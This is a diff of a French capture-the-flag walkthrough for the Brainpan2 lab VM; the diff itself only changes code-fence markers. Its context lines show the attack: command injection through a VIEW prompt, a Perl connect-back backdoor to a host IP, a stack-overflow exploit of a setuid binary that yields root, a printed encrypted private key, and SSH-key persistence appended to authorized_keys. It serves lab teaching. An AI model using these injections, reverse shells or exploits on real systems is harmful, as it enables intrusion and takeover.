@@ -98,7 +98,7 @@ Mais quand on l'analyse il ne s'agit que d'une image JPEG. Un coup de *hexdump* 
 
 Du coup je me retranche sur le port 9999 auquel je me connecte via *ncat*. On a affaire à un serveur de commandes fait maison qui comporte une poignée de commandes dont certaines ne sont pas implémentées (USERS, MSG) ou non-accessibles avec nos privilèges (SYSTEM).
 
-```plain
+```
 _|                            _|                                        
 _|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
 _|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
@@ -125,7 +125,7 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
 
 La commande FILES retourne une liste de fichier générée de toute évidence via un ls -l
 
-```plain
+```
 total 40
 -rwxr-xr-x 1 root   root   18424 Nov  4 15:17 brainpan.exe
 -rw-r--r-- 1 root   root    1109 Nov  5 09:24 brainpan.txt
@@ -151,7 +151,7 @@ La commande sous-jacente est un simple *cat*. Il est donc préférable de lui pa
 
 On passera plutôt nos commandes de cette façon :
 
-```plain
+```
                           >> VIEW
     ENTER FILE TO DOWNLOAD: /dev/null;id;uname -a;lsb_release -a
 uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
@@ -172,7 +172,7 @@ Sur la machine hôte on lance le web-serveur Python (*python -m SimpleHTTPServer
 
 On ouvre un port via *ncat* sur la machine hôte puis on établie la connexion depuis la machine invitée.  
 
-```plain
+```
                           >> VIEW
     ENTER FILE TO DOWNLOAD: /dev/null;perl dc.pl 192.168.1.3 9999
 Data Cha0s Connect Back Backdoor
@@ -203,7 +203,7 @@ tsh remplace très bien SSH car il offre un TTY et permet d'envoyer / récupére
 
 Une fois connecté on s’aperçoit en listant /home que l'utilisateur *reynard* a laissé des permissions à ses données en lecture pour tous.
 
-```plain
+```
 /home/reynard:
 total 44
 drwxr-xr-x 3 reynard reynard 4096 Nov  7 09:54 .
@@ -225,7 +225,7 @@ On relève principalement la présence d'un exécutable setuid root nommé *msg\
 
 Le contenu du fichier *readme.txt* dans le même dossier est le suivant :  
 
-```plain
+```
 msg_root is a quick way to send a message to the root user. 
 Messages are written to /tmp/msg.txt
 
@@ -241,7 +241,7 @@ $ ./msg_root "plop" "ceci est mon message"
 
 On retrouve dans le fichier /tmp/msg.txt :  
 
-```plain
+```
 plop: ceci est mon message
 ```
 
@@ -373,7 +373,7 @@ Je ne saurais pas dire si c'est la volonté du compilateur ou le résultat d'une
 
 Du coup on a une stack que l'on pourrait représenter de cette façon :  
 
-```plain
+```
 adresses hautes
 |  2nd arg  | <- ebp+12
 |  1er arg  | <- ebp+8
@@ -508,7 +508,7 @@ On a bien écrasé *saved\_msg* (mais seulement en partie car strcpy a ajouté u
 
 Maintenant testons avec 18 caractères (ou plus).  
 
-```plain
+```
 (gdb) r `python -c "print 'A'*25"` test
 Starting program: msg_root `python -c "print 'A'*25"` test
 
@@ -555,7 +555,7 @@ EGG => 0xbfff0007
 
 Comble de la malchance, un octet nul est présent dans l'adresse... Mais vu la taille du nop-sled on peut mettre 256 de plus, on est toujours dedans :  
 
-```plain
+```
 anansi@brainpan2:~$ /home/reynard/msg_root `perl -e 'print "A"x14 . "\x07\x01\xff\xbf"'` test
 $ id
 uid=104(root) gid=1000(anansi) groups=106(root),50(staff),1000(anansi)
@@ -650,7 +650,7 @@ En se connectant on remarque qu'il s'agit d'une version avec moins de fonctionna
 
 Par conséquent on récupère la clé privée SSH de *puck* :  
 
-```plain
+```
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
 DEK-Info: AES-128-CBC,BD1AC12F9D45BB7CAFB17D7CC7FEF8E5
@@ -687,7 +687,7 @@ Malheureusement la clé privée est protégée par une passphrase, impossible de
 
 Solution : on envoie nos clés publiques / privées sur le serveur puis on exploite VIEW pour ajouter la clé publique dans les clés autorisées de *puck* :
 
-```plain
+```
                           >> VIEW
     ENTER FILE TO DOWNLOAD: /dev/null;cat /tmp/id_rsa.pub >> /home/puck/.ssh/authorized_keys
 ```
@@ -708,7 +708,7 @@ That's all folks !
 
 C'est bien on a maintenant les droits de *puck*... So what ? Il a un dossier caché *.backup* :  
 
-```plain
+```
 ./.backup:
 total 28
 drwxr-xr-x 3 puck puck 4096 Nov  5 09:44 .
